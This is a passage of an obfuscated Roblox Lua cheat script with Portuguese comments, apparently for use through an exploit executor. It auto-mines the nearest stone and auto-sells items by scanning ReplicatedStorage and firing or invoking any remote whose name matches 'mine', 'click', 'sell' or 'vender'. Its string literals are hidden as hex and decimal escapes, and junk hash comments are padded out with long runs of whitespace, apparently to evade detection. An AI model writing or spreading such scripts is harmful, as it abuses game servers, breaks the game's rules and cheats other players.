                local tool = char:FindFirstChildOfClass("\84\111\111\108") or Player.Backpack:FindFirstChildOfClass("\84\111\111\108")
                                                                         -- 710e981164
                local alvo = nil
                local menorDist = 90
                for _, v in pairs(workspace:GetDescendants()) do
                    if v.Name == "\x50\x65\x64\x72\x61" and v:IsA("\x42\x61\x73\x65\x50\x61\x72\x74") and v.Transparency < 1 then
                        local d = (root.Position - v.Position).Magnitude
                                                     -- e417473b0c
                        if d < menorDist then menorDist = d alvo = v end
                    end
                                                                                                                                                                         -- 47f919fa7c
                end
                                                                                                                                              -- 10ee588f19
                if alvo then
                    if (root.Position - alvo.Position).Magnitude > 7.5 then
                        char.Humanoid:MoveTo(alvo.Position)
                    else
                                                                                                                                                 -- 3b877aa4f5
                        if tool.Parent ~= char then char.Humanoid:EquipTool(tool) end
                        tool:Activate()
                                                                    -- fb0180dcd7
                        for _, r in pairs(ReplicatedStorage:GetDescendants()) do
                                                         -- 49a6cefd4a
                            if r:IsA("\82\101\109\111\116\101\69\118\101\110\116") and (r.Name:lower():find("\109\105\110\101") or r.Name:lower():find("\x63\x6c\x69\x63\x6b")) then
                                r:FireServer(alvo)
                            end
                        end
                                                                                        -- 6c1a640e4f
                    end
                end
            end)
        end
        task.wait(0.1)
    end
end)
                                                       -- f8583f8fc3

-- [SELL]
local sellAtivo = false
SellBtn.MouseButton1Click:Connect(function()
    sellAtivo = not sellAtivo
    SellBtn.Text = sellAtivo and "\x41\x55\x54\x4f\x2d\x53\x45\x4c\x4c\x20\x41\x43\x54\x49\x56\x45" or "\x53\x54\x41\x52\x54\x20\x41\x55\x54\x4f\x2d\x53\x45\x4c\x4c"
end)
                                                                    -- 63565af451

task.spawn(function()
    while true do
        if sellAtivo then
            pcall(function()
                -- Tenta vender via Remotes globais primeiro
                                                                         -- 243bbc6223
                for _, r in pairs(ReplicatedStorage:GetDescendants()) do
                    if r:IsA("\x52\x65\x6d\x6f\x74\x65\x45\x76\x65\x6e\x74") or r:IsA("\82\101\109\111\116\101\70\117\110\99\116\105\111\110") then
                        local n = r.Name:lower()
                        if n:find("\x73\x65\x6c\x6c") or n:find("\x76\x65\x6e\x64\x65\x72") then
                            if r:IsA("\x52\x65\x6d\x6f\x74\x65\x45\x76\x65\x6e\x74") then r:FireServer(3) r:FireServer("\65\108\108") else r:InvokeServer(3) end
                        end
                                                                                      -- a1e7d24f06
                    end
                                                                -- 812afdd5ab
                end
                
                -- Venda individual de itens do inventário
                                                                           -- f9fb21457b
                local char = Player.Character
                for _, item in pairs(Player.Backpack:GetChildren()) do
                    -- CORREÇÃO: Verifica se o item NÃO é a Picareta antes de equipar/vender
                    -- Adicionada verificação por nome "\80\105\99\97\114\101\116\97" (conforme imagem) e "\80\105\99\107\97\120\101"
                    local itemName = item.Name:lower()
                    if item:IsA("\x54\x6f\x6f\x6c") and not (itemName:find("\x70\x69\x63\x6b\x61\x78\x65") or itemName:find("\112\105\99\97\114\101\116\97")) then
                                                                                                                 -- 05024a6bd3
                        char.Humanoid:EquipTool(item)
                                                  -- fc9e2e9886
                        task.wait(0.05)
                        for _, r in pairs(ReplicatedStorage:GetDescendants()) do
                            if r:IsA("\82\101\109\111\116\101\69\118\101\110\116") and (r.Name:lower():find("\x73\x65\x6c\x6c") or r.Name:lower():find("\118\101\110\100\101\114")) then 
                                                                                                                                                                    -- a5f62f8c8e
                                r:FireServer(item) 
                                                                                                                    -- 0dd34616c2
                            end
                        end
                                                                                              -- ff4330a3ad
                    end
                                                                                                                                                                                                   -- 743f81c8b2
                end
            end)
        end
                                                                                                                                                                                     -- a02c737804
        task.wait(1)
    end
end)
